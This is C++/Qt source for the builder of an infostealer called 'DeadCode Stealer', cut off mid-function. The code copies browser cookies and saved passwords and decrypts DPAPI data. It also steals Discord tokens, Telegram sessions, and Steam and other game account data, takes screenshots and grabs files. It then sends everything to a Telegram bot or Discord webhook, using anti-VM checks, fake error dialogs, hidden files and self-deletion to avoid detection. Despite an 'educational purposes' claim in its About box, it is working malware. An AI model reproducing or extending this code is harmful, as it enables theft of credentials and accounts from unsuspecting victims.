#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QDateTime>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <QPainter>
#include <QScrollBar>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <set>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <QThreadPool> // Добавлено для многопоточности
#include <QRunnable>   // Добавлено для многопоточности
#include <cstring> // Для memcpy
#include <QByteArray>
#include <array>
#include <cstdlib>

// Зашифрованные строки
const std::string encryptedDiscordPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\discord\\Local Storage\\leveldb\\"
const std::string encryptedSteamPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\SteamPath"
const std::string encryptedTelegramPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\Telegram Desktop\\tdata\\"
const std::string encryptedErrorMessage = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "Application has encountered a critical error and needs to close."
const std::string encryptedLogMessage = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "Ошибка: "
const std::string encryptedSuccessMessage = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0"; // "Успешно выполнено"

// Глобальная функция decryptString
std::string decryptString(const std::string& encrypted, size_t keyOffset) {
    std::string decrypted;
    for (size_t i = 0; i < encrypted.size(); ++i) {
        decrypted += encrypted[i] ^ (0xAA + ((i + keyOffset) % 0xFF));
    }
    return decrypted;
}

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append(static_cast<char*>(contents), newLength);
    } catch (const std::exception& e) {
        return 0; // Ошибка записи
    }
    return newLength;
}

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    QString timestamp = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss");
    emit logUpdated("[" + timestamp + "] " + message);
}

// Реализация метода updateConfigFromUI
void MainWindow::updateConfigFromUI() {
    QMutexLocker locker(&logMutex);

    if (sendMethodComboBox) config.sendMethod = sendMethodComboBox->currentText().toStdString();
    if (buildMethodComboBox) config.buildMethod = buildMethodComboBox->currentText().toStdString();
    if (tokenLineEdit) config.telegramBotToken = tokenLineEdit->text().toStdString();
    if (chatIdLineEdit) config.telegramChatId = chatIdLineEdit->text().toStdString();
    if (discordWebhookLineEdit) config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    if (fileNameLineEdit) config.filename = fileNameLineEdit->text().toStdString();
    if (iconPathLineEdit) config.iconPath = iconPathLineEdit->text().toStdString();
    if (githubTokenLineEdit) config.githubToken = githubTokenLineEdit->text().toStdString();
    if (githubRepoLineEdit) config.githubRepo = githubRepoLineEdit->text().toStdString();

    // Обновление чекбоксов
    if (discordCheckBox) config.discord = discordCheckBox->isChecked();
    if (steamCheckBox) config.steam = steamCheckBox->isChecked();
    if (steamMAFileCheckBox) config.steamMAFile = steamMAFileCheckBox->isChecked();
    if (epicCheckBox) config.epic = epicCheckBox->isChecked();
    if (robloxCheckBox) config.roblox = robloxCheckBox->isChecked();
    if (battlenetCheckBox) config.battlenet = battlenetCheckBox->isChecked();
    if (minecraftCheckBox) config.minecraft = minecraftCheckBox->isChecked();
    if (cookiesCheckBox) config.cookies = cookiesCheckBox->isChecked();
    if (passwordsCheckBox) config.passwords = passwordsCheckBox->isChecked();
    if (screenshotCheckBox) config.screenshot = screenshotCheckBox->isChecked();
    if (fileGrabberCheckBox) config.fileGrabber = fileGrabberCheckBox->isChecked();
    if (systemInfoCheckBox) config.systemInfo = systemInfoCheckBox->isChecked();
    if (socialEngineeringCheckBox) config.socialEngineering = socialEngineeringCheckBox->isChecked();
    if (chatHistoryCheckBox) config.chatHistory = chatHistoryCheckBox->isChecked();
    if (telegramCheckBox) config.telegram = telegramCheckBox->isChecked();
    if (antiVMCheckBox) config.antiVM = antiVMCheckBox->isChecked();
    if (fakeErrorCheckBox) config.fakeError = fakeErrorCheckBox->isChecked();
    if (silentCheckBox) config.silent = silentCheckBox->isChecked();
    if (autoStartCheckBox) config.autoStart = autoStartCheckBox->isChecked();
    if (persistCheckBox) config.persist = persistCheckBox->isChecked();
    if (selfDestructCheckBox) config.selfDestruct = selfDestructCheckBox->isChecked();
    if (arizonaRPCheckBox) config.arizonaRP = arizonaRPCheckBox->isChecked();
    if (radmirRPCheckBox) config.radmirRP = radmirRPCheckBox->isChecked();
}

// Реализация метода decryptString как метода класса
std::string MainWindow::decryptString(const std::string& encrypted, size_t keyOffset) {
    std::string decrypted;
    for (size_t i = 0; i < encrypted.size(); ++i) {
        decrypted += encrypted[i] ^ (0xAA + ((i + keyOffset) % 0xFF));
    }
    return decrypted;
}

// Вспомогательная функция для расшифровки данных через DPAPI
QByteArray MainWindow::decryptDPAPIData(const QByteArray& encryptedData) {
    DATA_BLOB inBlob, outBlob;
    inBlob.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(encryptedData.data()));
    inBlob.cbData = static_cast<DWORD>(encryptedData.size());

    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        QByteArray decryptedData(reinterpret_cast<char*>(outBlob.pbData), static_cast<int>(outBlob.cbData));
        LocalFree(outBlob.pbData);
        return decryptedData;
    } else {
        emitLog("Ошибка расшифровки DPAPI: " + QString::number(GetLastError()));
        return QByteArray();
    }
}

// Класс для многопоточного сбора данных
class DataStealer : public QRunnable {
public:
    DataStealer(MainWindow* mw, const std::string& tempDir, const std::string& type)
        : mw(mw), tempDir(tempDir), type(type) {}
    void run() override {
        std::string result;
        if (type == "systemInfo") result = mw->collectSystemInfo(tempDir);
        else if (type == "discord") result = mw->StealDiscordTokens(tempDir);
        else if (type == "steam") result = mw->StealSteamData(tempDir);
        else if (type == "telegram") result = mw->StealTelegramData(tempDir);
        else if (type == "epic") result = mw->StealEpicGamesData(tempDir);
        else if (type == "roblox") result = mw->StealRobloxData(tempDir);
        else if (type == "battlenet") result = mw->StealBattleNetData(tempDir);
        else if (type == "minecraft") result = mw->StealMinecraftData(tempDir);
        else if (type == "browser") result = mw->stealBrowserData(tempDir);
        else if (type == "chatHistory") result = mw->stealChatHistory(tempDir);
        else if (type == "socialEngineering") result = mw->collectSocialEngineeringData(tempDir);
        else if (type == "arizonaRP") result = mw->StealArizonaRPData(tempDir); // Исправлено
        else if (type == "radmirRP") result = mw->StealRadmirRPData(tempDir);   // Исправлено
        mw->collectedData[type] = result;
    }
private:
    MainWindow* mw;
    std::string tempDir;
    std::string type;
};

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this;

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->fileNameLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    selfDestructCheckBox = ui->selfDestructCheckBox;
    arizonaRPCheckBox = ui->arizonaRPCheckBox;
    radmirRPCheckBox = ui->radmirRPCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    clearLogsButton = ui->clearLogsButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    if (sendMethodComboBox) sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    if (buildMethodComboBox) buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});
    if (fileNameLineEdit) fileNameLineEdit->setText("DeadCode.exe");
    if (textEdit) textEdit->setPlaceholderText("Logs will appear here...");

    // Загрузка сохранённых настроек
    QSettings settings("DeadCode", "Stealer");
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();
    config.arizonaRP = settings.value("arizonaRP", false).toBool();
    config.radmirRP = settings.value("radmirRP", false).toBool();

    // Установка начальных значений из config
    if (sendMethodComboBox) sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    if (buildMethodComboBox) buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    if (tokenLineEdit) tokenLineEdit->setText(QString::fromStdString(config.telegramBotToken));
    if (chatIdLineEdit) chatIdLineEdit->setText(QString::fromStdString(config.telegramChatId));
    if (discordWebhookLineEdit) discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    if (fileNameLineEdit) fileNameLineEdit->setText(QString::fromStdString(config.filename));
    if (iconPathLineEdit) iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    if (githubTokenLineEdit) githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    if (githubRepoLineEdit) githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));
    if (discordCheckBox) discordCheckBox->setChecked(config.discord);
    if (steamCheckBox) steamCheckBox->setChecked(config.steam);
    if (steamMAFileCheckBox) steamMAFileCheckBox->setChecked(config.steamMAFile);
    if (epicCheckBox) epicCheckBox->setChecked(config.epic);
    if (robloxCheckBox) robloxCheckBox->setChecked(config.roblox);
    if (battlenetCheckBox) battlenetCheckBox->setChecked(config.battlenet);
    if (minecraftCheckBox) minecraftCheckBox->setChecked(config.minecraft);
    if (cookiesCheckBox) cookiesCheckBox->setChecked(config.cookies);
    if (passwordsCheckBox) passwordsCheckBox->setChecked(config.passwords);
    if (screenshotCheckBox) screenshotCheckBox->setChecked(config.screenshot);
    if (fileGrabberCheckBox) fileGrabberCheckBox->setChecked(config.fileGrabber);
    if (systemInfoCheckBox) systemInfoCheckBox->setChecked(config.systemInfo);
    if (socialEngineeringCheckBox) socialEngineeringCheckBox->setChecked(config.socialEngineering);
    if (chatHistoryCheckBox) chatHistoryCheckBox->setChecked(config.chatHistory);
    if (telegramCheckBox) telegramCheckBox->setChecked(config.telegram);
    if (antiVMCheckBox) antiVMCheckBox->setChecked(config.antiVM);
    if (fakeErrorCheckBox) fakeErrorCheckBox->setChecked(config.fakeError);
    if (silentCheckBox) silentCheckBox->setChecked(config.silent);
    if (autoStartCheckBox) autoStartCheckBox->setChecked(config.autoStart);
    if (persistCheckBox) persistCheckBox->setChecked(config.persist);
    if (selfDestructCheckBox) selfDestructCheckBox->setChecked(config.selfDestruct);
    if (arizonaRPCheckBox) arizonaRPCheckBox->setChecked(config.arizonaRP);
    if (radmirRPCheckBox) radmirRPCheckBox->setChecked(config.radmirRP);

    // Анимация для логотипа
    if (ui->logoLabel) {
        QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
        logoAnimation->setDuration(1500);
        logoAnimation->setStartValue(QRect(0, -150, 600, 150));
        logoAnimation->setEndValue(QRect(0, 0, 600, 150));
        logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
        logoAnimation->start();
    }

    // Анимация пульсации для кнопки "Собрать"
    if (buildButton) {
        QPropertyAnimation *buttonAnimation = new QPropertyAnimation(buildButton, "size", this);
        buttonAnimation->setDuration(1000);
        buttonAnimation->setStartValue(QSize(100, 40));
        buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
        buttonAnimation->setEndValue(QSize(100, 40));
        buttonAnimation->setLoopCount(-1);
        buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
        buttonAnimation->start();
    }

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    if (ui->statusbar) ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    if (buildButton) connect(buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    if (iconBrowseButton) connect(iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    if (clearLogsButton) connect(clearLogsButton, &QPushButton::clicked, this, &MainWindow::on_clearLogsButton_clicked);
    if (actionSaveConfig) connect(actionSaveConfig, &QAction::triggered, this, &MainWindow::saveConfig);
    if (actionLoadConfig) connect(actionLoadConfig, &QAction::triggered, this, &MainWindow::loadConfig);
    if (actionExportLogs) connect(actionExportLogs, &QAction::triggered, this, &MainWindow::exportLogs);
    if (actionExit) connect(actionExit, &QAction::triggered, this, &QApplication::quit);
    if (actionAbout) connect(actionAbout, &QAction::triggered, this, [this]() {
        QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей.\n\n© 2025");
    });
    if (manager) connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    if (sendMethodComboBox) connect(sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        if (ui->statusbar) ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    if (buildTimer) connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    if (statusCheckTimer) connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    // Лямбда для startStealSignal
    connect(this, &MainWindow::startStealSignal, this, [this]() {
        std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + generateRandomString(8);
        QThread* thread = new QThread;
        StealerWorker* worker = new StealerWorker(this, tempDir);
        worker->moveToThread(thread);
        connect(thread, &QThread::started, worker, &StealerWorker::process);
        connect(worker, &StealerWorker::finished, thread, &QThread::quit);
        connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
        thread->start();
    });

    // Инициализация config начальными значениями
    updateConfigFromUI();
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
}

// Вспомогательный метод для кражи данных из Chromium-браузеров
std::string MainWindow::stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir) {
    std::string result;
    std::string cookiesPath = profilePath + "\\Cookies";
    std::string passwordsPath = profilePath + "\\Login Data";
    std::string destCookies = tempDir + "\\" + browserName + "_Cookies";
    std::string destPasswords = tempDir + "\\" + browserName + "_Login_Data";

    try {
        if (std::filesystem::exists(cookiesPath) && config.cookies) {
            std::filesystem::copy_file(cookiesPath, destCookies, std::filesystem::copy_options::overwrite_existing);
            collectedFiles.push_back(destCookies);
            result += browserName + " cookies stolen successfully.\n";
        }
        if (std::filesystem::exists(passwordsPath) && config.passwords) {
            std::filesystem::copy_file(passwordsPath, destPasswords, std::filesystem::copy_options::overwrite_existing);
            collectedFiles.push_back(destPasswords);
            result += browserName + " passwords stolen successfully.\n";
        }
    } catch (const std::exception& e) {
        result += "Error stealing " + browserName + " data: " + e.what() + "\n";
    }
    return result;
}

// Обновленный метод stealBrowserData
std::string MainWindow::stealBrowserData(const std::string& tempDir) {
    std::stringstream output;
    if (config.cookies || config.passwords) {
        output << "Stealing browser data...\n";

        std::vector<std::pair<std::string, std::string>> browsers = {
            {"Chrome", std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default"},
            {"Opera", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera Stable"},
            {"OperaGX", std::string(getenv("APPDATA")) + "\\Opera Software\\Opera GX Stable"},
            {"Edge", std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Default"},
            {"Brave", std::string(getenv("LOCALAPPDATA")) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
            {"Yandex", std::string(getenv("LOCALAPPDATA")) + "\\Yandex\\YandexBrowser\\User Data\\Default"}
        };

        for (const auto& [name, path] : browsers) {
            if (std::filesystem::exists(path)) {
                emitLog("Сбор данных браузера: " + QString::fromStdString(name));
                output << stealChromiumBrowserData(path, name, tempDir);
            } else {
                emitLog("Директория " + QString::fromStdString(name) + " не найдена, пропускаем...");
            }
        }
    }
    return output.str();
}

// Обновленный метод saveToLocalFile
void MainWindow::saveToLocalFile(const std::string& data, const std::string& tempDir) {
    emitLog("Сохранение данных локально в директории: " + QString::fromStdString(tempDir));
    std::string outputDir = tempDir + "\\output";
    std::filesystem::create_directories(outputDir);
    std::string persistPath = outputDir + "\\" + (config.filename.empty() ? "stolen_data_" + generateRandomString(8) + ".bin" : config.filename);
    std::ofstream file(persistPath, std::ios::binary);
    if (file.is_open()) {
        file.write(data.data(), data.size()); // Используем write для бинарных данных
        file.close();
        if (SetFileAttributesA(persistPath.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
            emitLog("Файл сохранен и скрыт: " + QString::fromStdString(persistPath));
        } else {
            emitLog("Ошибка установки атрибута скрытия для файла: " + QString::number(GetLastError()));
        }
    } else {
        emitLog("Ошибка: Не удалось сохранить файл " + QString::fromStdString(persistPath));
    }
}

// Обновленный метод StealAndSendData с многопоточностью
std::string MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Запуск процесса кражи и отправки данных в " + QString::fromStdString(tempDir));

    if (config.antiVM && isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина, процесс остановлен");
        if (config.fakeError) {
            MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Critical Error", MB_ICONERROR);
        }
        return "VM Detected";
    }

    updateConfigFromUI();

    try {
        std::filesystem::create_directories(tempDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории: " + QString::fromStdString(e.what()));
        return "Directory Creation Failed: " + std::string(e.what());
    }
    collectedFiles.clear();
    collectedData.clear();

    std::stringstream output;
    output << "=== DeadCode Stealer Report ===\n";
    output << "Date: " << QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss").toStdString() << "\n";
    output << "Victim: " << QHostInfo::localHostName().toStdString() << "\n\n";

    QThreadPool pool;
    pool.setMaxThreadCount(QThread::idealThreadCount());

    if (config.systemInfo) pool.start(new DataStealer(this, tempDir, "systemInfo"));
    if (config.discord) pool.start(new DataStealer(this, tempDir, "discord"));
    if (config.steam) pool.start(new DataStealer(this, tempDir, "steam"));
    if (config.telegram) pool.start(new DataStealer(this, tempDir, "telegram"));
    if (config.epic) pool.start(new DataStealer(this, tempDir, "epic"));
    if (config.roblox) pool.start(new DataStealer(this, tempDir, "roblox"));
    if (config.battlenet) pool.start(new DataStealer(this, tempDir, "battlenet"));
    if (config.minecraft) pool.start(new DataStealer(this, tempDir, "minecraft"));
    if (config.cookies || config.passwords) pool.start(new DataStealer(this, tempDir, "browser"));
    if (config.chatHistory) pool.start(new DataStealer(this, tempDir, "chatHistory"));
    if (config.socialEngineering) pool.start(new DataStealer(this, tempDir, "socialEngineering"));
    if (config.arizonaRP) pool.start(new DataStealer(this, tempDir, "arizonaRP"));
    if (config.radmirRP) pool.start(new DataStealer(this, tempDir, "radmirRP"));

    if (config.screenshot) {
        std::string screenshotPath = TakeScreenshot(tempDir);
        if (!screenshotPath.empty()) collectedFiles.push_back(screenshotPath);
    }
    if (config.fileGrabber) {
        std::vector<std::string> grabbedFiles = GrabFiles(tempDir);
        collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
    }

    pool.waitForDone();

    if (config.systemInfo) output << "[System Info]\n" << collectedData["systemInfo"] << "\n";
    if (config.discord) output << "[Discord Tokens]\n" << collectedData["discord"] << "\n";
    if (config.steam) output << "[Steam Data]\n" << collectedData["steam"] << "\n";
    if (config.telegram) output << "[Telegram Data]\n" << collectedData["telegram"] << "\n";
    if (config.epic) output << "[Epic Games Data]\n" << collectedData["epic"] << "\n";
    if (config.roblox) output << "[Roblox Data]\n" << collectedData["roblox"] << "\n";
    if (config.battlenet) output << "[Battle.net Data]\n" << collectedData["battlenet"] << "\n";
    if (config.minecraft) output << "[Minecraft Data]\n" << collectedData["minecraft"] << "\n";
    if (config.cookies || config.passwords) output << "[Browser Data]\n" << collectedData["browser"] << "\n";
    if (config.chatHistory) output << "[Chat History]\n" << collectedData["chatHistory"] << "\n";
    if (config.socialEngineering) output << "[Social Engineering Data]\n" << collectedData["socialEngineering"] << "\n";
    if (config.arizonaRP) output << "[GTA SAMP Arizona Data]\n" << collectedData["arizonaRP"] << "\n";
    if (config.radmirRP) output << "[CRMP Radmir RolePlay Data]\n" << collectedData["radmirRP"] << "\n";

    std::string reportPath = tempDir + "\\report.txt";
    std::ofstream reportFile(reportPath);
    if (reportFile.is_open()) {
        reportFile << output.str();
        reportFile.close();
        collectedFiles.push_back(reportPath);
    } else {
        emitLog("Ошибка: Не удалось сохранить отчет в " + QString::fromStdString(reportPath));
    }

    std::string encryptedData = encryptData(output.str());
    if (encryptedData.empty()) {
        emitLog("Ошибка: Не удалось зашифровать данные");
        return "Encryption Failed";
    }

    if (config.sendMethod == "Telegram") {
        sendToTelegram(encryptedData, collectedFiles);
    } else if (config.sendMethod == "Discord") {
        sendToDiscord(encryptedData, collectedFiles);
    } else {
        saveToLocalFile(encryptedData, tempDir);
    }

    if (config.selfDestruct) {
        try {
            std::filesystem::remove_all(tempDir);
            emitLog("Самоуничтожение: Временная директория удалена");
            char exePath[MAX_PATH];
            if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
                std::string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > NUL & del \"" + std::string(exePath) + "\"";
                system(cmd.c_str());
            } else {
                emitLog("Ошибка получения пути к исполняемому файлу для самоуничтожения");
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка самоуничтожения: " + QString::fromStdString(e.what()));
        }
    }

    return output.str();
}

std::string MainWindow::encryptData(const std::string& data) {
    if (data.empty()) {
        emitLog("Ошибка: Пустые данные для шифрования");
        return "";
    }

    // Получаем ключи и IV
    auto key1 = GetEncryptionKey(true);  // XOR ключ
    auto key2 = GetEncryptionKey(false); // AES ключ
    auto iv = generateIV();              // Вектор инициализации

    // Применяем XOR
    QByteArray dataBytes(data.c_str(), static_cast<int>(data.size()));
    QByteArray xorData = applyXOR(dataBytes, key1);

    // Применяем AES
    QByteArray encryptedData = applyAES(xorData, key2, iv);
    if (encryptedData.isEmpty()) {
        emitLog("Ошибка: Не удалось выполнить AES-шифрование");
        return "";
    }

    // Формируем результат: IV + зашифрованные данные
    std::string result;
    result.reserve(16 + encryptedData.size());
    result.append(reinterpret_cast<const char*>(iv.data()), 16); // IV - 16 байт
    result.append(encryptedData.constData(), encryptedData.size());

    emitLog("Данные успешно зашифрованы, длина: " + QString::number(result.size()));
    return result;
}

// Реализация StealArizonaRPData (Arizona RP на SAMP)
std::string MainWindow::StealArizonaRPData(const std::string& dir) {
    emitLog("Начало кражи данных Arizona RP (SAMP)...");

    std::string arizonaDir = dir + "\\ArizonaRPData";
    std::filesystem::create_directories(arizonaDir);

    std::string result;

    // Получаем путь к APPDATA
    const char* appDataPath = std::getenv("APPDATA");
    if (!appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Arizona RP");
        return "";
    }
    std::string appData(appDataPath);

    // Путь к samp.ini (конфигурация SAMP)
    std::string sampConfigPath = appData + "\\SA-MP\\samp.ini";
    if (std::filesystem::exists(sampConfigPath)) {
        std::string arizonaConfigPath = arizonaDir + "\\arizona_samp_config.txt";
        std::filesystem::copy_file(sampConfigPath, arizonaConfigPath, std::filesystem::copy_options::overwrite_existing);
        SetFileAttributesA(arizonaConfigPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
        collectedFiles.push_back(arizonaConfigPath);

        // Читаем файл для извлечения данных
        std::ifstream configFile(sampConfigPath);
        std::string line, configContent;
        while (std::getline(configFile, line)) {
            configContent += line + "\n";
            // Ищем никнейм и сервер (Arizona RP)
            if (line.find("last_nick") != std::string::npos || 
                line.find("server") != std::string::npos) {
                result += "Arizona RP (SAMP): " + line + "\n";
            }
        }
        configFile.close();

        // Сохраняем содержимое
        std::ofstream outFile(arizonaConfigPath);
        if (outFile.is_open()) {
            outFile << configContent;
            outFile.close();
            emitLog("Конфигурация Arizona RP (SAMP) сохранена и скрыта: " + QString::fromStdString(arizonaConfigPath));
        } else {
            emitLog("Ошибка: Не удалось сохранить конфигурацию Arizona RP");
        }
    } else {
        emitLog("Файл samp.ini для Arizona RP не найден");
    }

    // Проверка кэша SAMP (USERDATA)
    std::string sampCachePath = appData + "\\SA-MP\\USERDATA";
    if (std::filesystem::exists(sampCachePath)) {
        for (const auto& entry : std::filesystem::directory_iterator(sampCachePath)) {
            std::string fileName = entry.path().filename().string();
            // Ищем файлы, связанные с Arizona RP (например, по имени сервера)
            if (fileName.find("arizona") != std::string::npos || fileName.find(".dat") != std::string::npos) {
                std::string destFilePath = arizonaDir + "\\" + fileName;
                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
                collectedFiles.push_back(destFilePath);
                result += "Arizona RP (SAMP) Cache: " + fileName + "\n";
                emitLog("Кэш Arizona RP (SAMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
            }
        }
    }

    if (result.empty()) {
        emitLog("Данные Arizona RP (SAMP) не найдены");
        std::filesystem::remove_all(arizonaDir);
        return "";
    }

    emitLog("Кража данных Arizona RP (SAMP) завершена");
    return result;
}

// Реализация StealRadmirRPData (Radmir RP на CRMP)
std::string MainWindow::StealRadmirRPData(const std::string& dir) {
    emitLog("Начало кражи данных Radmir RP (CRMP)...");

    std::string radmirDir = dir + "\\RadmirRPData";
    std::filesystem::create_directories(radmirDir);

    std::string result;

    // Получаем путь к APPDATA
    const char* appDataPath = std::getenv("APPDATA");
    if (!appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Radmir RP");
        return "";
    }
    std::string appData(appDataPath);

    // Путь к settings.ini (конфигурация Radmir CRMP)
    std::string radmirConfigPath = appData + "\\RadmirCRMP\\settings.ini";
    if (std::filesystem::exists(radmirConfigPath)) {
        std::string radmirDestPath = radmirDir + "\\radmir_config.txt";
        std::filesystem::copy_file(radmirConfigPath, radmirDestPath, std::filesystem::copy_options::overwrite_existing);
        SetFileAttributesA(radmirDestPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
        collectedFiles.push_back(radmirDestPath);

        // Читаем файл для извлечения данных
        std::ifstream configFile(radmirConfigPath);
        std::string line, configContent;
        while (std::getline(configFile, line)) {
            configContent += line + "\n";
            // Ищем никнейм, сервер или сессионные данные
            if (line.find("nickname") != std::string::npos || 
